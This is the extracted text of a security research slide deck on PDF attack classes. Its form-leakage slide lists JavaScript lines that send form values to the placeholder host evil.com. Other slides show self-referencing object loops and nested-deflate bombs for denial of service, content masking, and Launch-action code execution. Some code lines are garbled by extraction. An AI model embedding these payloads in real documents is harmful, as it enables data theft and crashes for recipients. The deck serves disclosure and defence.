Portable Document Flaws 101
Jens Müller, Dominik Noss, Christian Mainka, Vladislav Mladenov, Jörg Schwenk

Overview
1. PDF Basics 2. Denial of Service 3. Information Disclosure 4. Data Manipulation 5. Code Execution 6. Evaluation
2

The Portable Document Format

"De facto standard for electronic exchange of documents" -- Adobe

FIRST VERSION RELEASED IN
1993 BY ADOBE
PDF-2.0
RELEASED IN 2017, LATEST VERSION BY ISO

250 BILLION
PDF DOCUMENTS OPENED IN 2018
USED BY
~99%
COMPANIES AND GOVERNMENTAL INSTITUTIONS WORLDWIDE

3

Basics: PDF Structure
4

Basics: PDF Structure
5

Basics: PDF Structure

%PDF-1.7 1 0 obj Catalog /Pages 2 0 R
4 0 obj stream ,,Hello world!"
xref
trailer /Root 1 0 R

Header
Body
XRef Table Trailer
6

Related Work

PDF Encryption: [Mueller2019] PDF Signatures: [Mladenov2019] PDF Redaction: [Garfinkel2013]
PDF Metadata: [Alonso2008] PDF Polyglots: [Albertini2014]

GIF89a... %PDF-1.7
1 0 obj Catalog /Pages 2 0 R
4 0 obj stream ,,Hello world!"
xref
trailer /Root 1 0 R

 1023 bytes
Header
Body
XRef Table Trailer
7

Basics: PDF Actions
· Standard feature used for various purposes
­ Open hyperlink, go to a certain page, etc. ­ Even JavaScript is an action
· Various events that trigger actions
­ on open/close/print, etc.
· Target of actions: PDF File Specification
8

Events

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

Java Script

Actions

Targets

Embedded File

Local File

URL Network Share

Attacker Model
· Victim opens malicious PDF document · Bad things happen (attack-dependent) · No user interaction required
12

Overview
1. PDF Basics 2. Denial of Service
 Infinite Loop, Deflate Bomb
3. Information Disclosure 4. Data Manipulation 5. Code Execution 6. Evaluation
13

DoS Evaluation Results
Infinite Loop
14

Infinite Loop
/Pages 2 0 R

2 0 obj << /Type /Pages /Kids [3 0 R] >>
endobj
15

Infinite Loop
/Pages 2 0 R

2 0 obj << /Type /Pages /Kids [2 0 R] >>
endobj
CVE-2007-0104
16

More Variants
Action loop ­ PDF actions allow to specify a /Next action.
5 0 obj << /Type /Action /S /GoTo /Next 5 0 R >>
endobj
17

More Variants
ObjStm loop ­ Object streams may extend other ObjStms.
5 0 obj << /Type /ObjStm /Extends 5 0 R >>
stream endstream endobj
18

More Variants
Outline loop ­ PDF outline entries can refer to each other. 5 0 obj << /Type /Outlines /First << /A << /First 5 0 R >> >> >> endobj
19

More Variants
Calculations ­ PDF defines PS/Type 4 calculator functions.
5 0 obj << /FunctionType 4 >>
stream {/f {f} def f} endstream endobj
20

More Variants
JavaScript ­ Scripting can be used to create endless loops.
5 0 obj << /Type /Action /S /JavaScript /JS (while(1){}) >>
endobj
21

DoS Evaluation Results
Deflate Bomb
22

Deflate Bomb

· Zip bombs are well known · Streams can be compressed · Viewers must decompress
to display the content

789cecdc3d2e...

23

Deflate Bomb
4 0 obj << /Length 50 >>
stream BT /F1 22 Tf 30 800 Td (Hello World...) Tj ET
endstream
24

Deflate Bomb
4 0 obj << /Length 10737418240 >>
stream BT /F1 22 Tf 30 800 Td (AAAAAAAAAAA...) Tj ET
endstream

disk: 10 GB mem: 10 GB ----------------
ratio: 1:1
25

Deflate Bomb

4 0 obj << /Filter [/FlateDecode] /Length 10436259 >>
stream 789cecdc3d2e84011486d16f... endstream

disk: 10 MB mem: 10 GB ----------------
ratio: 1:1023

26

Deflate Bomb

4 0 obj << /Filter [/FlateDecode /FlateDecode] /Length 16757 >>
stream 789cedda5d4853611cc7f1b3... endstream

disk: 16 KB mem: 10 GB ----------------
ratio: 1:640,772
27

Deflate Bomb

4 0 obj << /Filter [/FlateDecode /FlateDecode /FlateDecode] /Length 578 >>
stream 789c014202bdfd789cedda5d... endstream

disk: 578 B mem: 10 GB ----------------
ratio: 1:18,576,848
28

Overview
1. PDF Basics 2. Denial of Service 3. Information Disclosure
 URL Invocation, Form Data Leakage, Local File Leakage, Credential Theft
4. Data Manipulation 5. Code Execution 6. Evaluation
29

DoS Evaluation Results
URL Invocation
30

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Catalog
/Names /AA /OpenAction

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

URI
/Base /URI

JavaScript

Compare [Filiol2008]

Embedded File

File

Local File

URL Network Share

31

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Catalog
/Names /AA /OpenAction

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

URI
/Base /URI

JavaScript

Compare [Filiol2008]

Embedded File

File

Local File

URL Network Share

32

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

33

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

34

35

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

36

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

37

DoS Evaluation Results
Form Data Leakage
38

Form Data Leakage
· Idea: victim obtains modified PDF form
· Attacker silently exfiltrates data
39

Source: wondershare.com

Page
/AA /Contents

Annotation
/AA on close /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA did print /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

40

Page
/AA /Contents

Annotation
/AA on close /Link

Field
/AA

Catalog
/Names /AA did print /OpenAction

Call Action

vLaaluunceh = thThirse.adgetAnGnooTotEs()[0G]o.TocRonteInmtpso;rtData SubmitForm

URI

JavaScript

th/iPrsin.tsubmitForm({cURL: "http://evil.com/"}); this.getURL("http://evil.com/"+value);

/Base

ap/pO.pelnaunchURL("http://evil.com/"+value);

/URI

app.media.getURLData("http://evil.com/"+value, "audio/mp3");

SOAP.connect("http://evil.com/"+valuFeil)e; SOAP.request({cURL:"http://evil.com/"+value, oRequest:{}, cAction:""});

this.importDataObject("file", "http://evil.com/"+value);

app.openDoc("htEtmpb:e/d/deedviFille.com/"L+ovcaallFuilee); URL Network Share

41

DoS Evaluation Results
Local File Leakage
42

Local File Leakage
· Goal: exfiltrate arbitrary files on disk to attacker by chaining PDF features
43

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

44

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

45

DoS Evaluation Results
Credential Theft
46

Credential Theft
· Offline cracking
­ NTLMv2: modern GPU requires 2,5h for eight chars ­ NTLMv1, LM: considered broken [Marlinspike2012]
· Pass-the-hash or relay attacks
­ Compare [Ochoa2008, Hummel2009] ­ Depending on Windows security policy
47

Credential Theft
48

Source: Threatpost

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

49

Overview
1. PDF Basics 2. Denial of Service 3. Information Disclosure 4. Data Manipulation
 Form Modification, File Write Access, Content Masking
5. Code Execution 6. Evaluation
38

DoS Evaluation Results
Form Modification
51

Form Modification
· Idea: victim obtains modified PDF form
· Attacker silently manipulares data (e.g., on printing)
52

Source: wondershare.com

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA will print /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

53

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Catalog
/Names /AA will print /OpenAction

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

URI
/Base /URI

JavaScript

File old_value = getAnnots()[i].contents;

getAnnots()[i].contents = "new value";

Embedded File

Local File

URL Network Share

54

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Catalog
/Names /AA did print /OpenAction

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

URI
/Base /URI

JavaScript

File getAnnots()[i].contents = old_value;

Embedded File

Local File

URL Network Share

55

DoS Evaluation Results
File Write Access
56

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

57

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Catalog
/Names /AA /OpenAction

Launch
/Print /Open

this.exportAsFDF(false,Caltl Arcuteio,n "file.fdf"); this.exportAsXFDF(false, true, "file.xfdf") Thrteahdis.exGpooTorEtAsTeGxoTto(RtrueI,mp"ofrtiDlaeta.txtS"u)b;mitForm this.exportDataObject({cName: "file.pdf"}); this.exportXFAData({cPath: "file.xdp"}); this.extractPages({cPath: "file.pdf"});

URI
/Base /URI

JavaScript

File

Embedded File

Local File

URL Network Share

58

DoS Evaluation Results
Content Masking
59

Content Masking
Spec ambiguities

%PDF-1.7 1 0 obj Catalog /Pages 2 0 R
4 0 obj stream ,,Hello world!"
xref
trailer /Root 1 0 R

Header
Body
XRef Table Trailer
60

Content Masking
Spec ambiguities · PDF confusion

%PDF-1.7 1 0 obj Catalog /Pages 2 0 R
4 0 obj stream ,,Hello world!"
xref
trailer /Root 1 0 R

Header
Body
XRef Table Trailer
61

Content Masking
Spec ambiguities · PDF confusion · Doc confusion

%PDF-1.7 1 0 obj Catalog /Pages 2 0 R
4 0 obj stream ,,Hello world!"
xref
trailer /Root 1 0 R

Header
Body
XRef Table Trailer
62

Content Masking
Spec ambiguities · PDF confusion · Doc confusion · Object confusion

%PDF-1.7 1 0 obj Catalog /Pages 2 0 R
4 0 obj stream ,,Hello world!"
xref
trailer /Root 1 0 R

Header
Body
XRef Table Trailer
63

Content Masking
Spec ambiguities · PDF confusion · Doc confusion · Object confusion · Content streams

%PDF-1.7 1 0 obj Catalog /Pages 2 0 R
4 0 obj stream ,,Hello world!"
xref
trailer /Root 1 0 R

Header
Body
XRef Table Trailer
64

Content Masking
Spec ambiguities · PDF confusion · Doc confusion · Object confusion · Content streams · Stream syntax

%PDF-1.7 1 0 obj Catalog /Pages 2 0 R
4 0 obj stream ,,Hello world!"
xref
trailer /Root 1 0 R

Header
Body
XRef Table Trailer
65

Content Masking
4 0 obj << /Length 200 >>
stream q 0.2 0.4 1 rg 0 0 595 842 re F Q BT /F1 22 Tf 30 800 Td (This is the 1st stream part) Tj ET
endstream q 1 0.3 0.3 rg 0 0 595 842 re F Q BT /F1 22 Tf 30 800 Td (This is the 2nd stream part) Tj ET
endstream endobj
66

Content Masking
4 0 obj << /Length 200 >>
stream q 0.2 0.4 1 rg 0 0 595 842 re F Q BT /F1 22 Tf 30 800 Td (This is the 1st stream part) Tj ET
endstream q 1 0.3 0.3 rg 0 0 595 842 re F Q BT /F1 22 Tf 30 800 Td (This is the 2nd stream part) Tj ET
endstream endobj
67

Content Masking
68

Content Masking
69

Overview
1. PDF Basics 2. Denial of Service 3. Information Disclosure 4. Data Manipulation 5. Code Execution
 Launch Action
6. Evaluation
49

DoS Evaluation Results
Launch Action
71

Code Execution
· Launch Action: · PDF has "code execution by design"
72

Page
/AA /Contents

Annotation
/AA /Link

Field
/AA

Launch
/Print /Open

Thread

GoToE

GoToR

Call Action ImportData SubmitForm

File

Catalog
/Names /AA /OpenAction

URI
/Base /URI

JavaScript

Embedded File

Local File

URL Network Share

73

Overview
1. PDF Basics 2. Denial of Service 3. Information Disclosure 4. Data Manipulation 5. Code Execution 6. Evaluation
53

75

Countermeasures
· Eliminating specification ambiguities · Resource limitation and sandboxing · Removing or restricting JavaScript · Identification of dangerous paths
76

Black Hat Sound Bytes
· PDF is a complex format · Standard is full of pitfalls · Logic chain RCE in 2020 :)
Exploits: https://github.com/RUB-NDS/PDF101
77

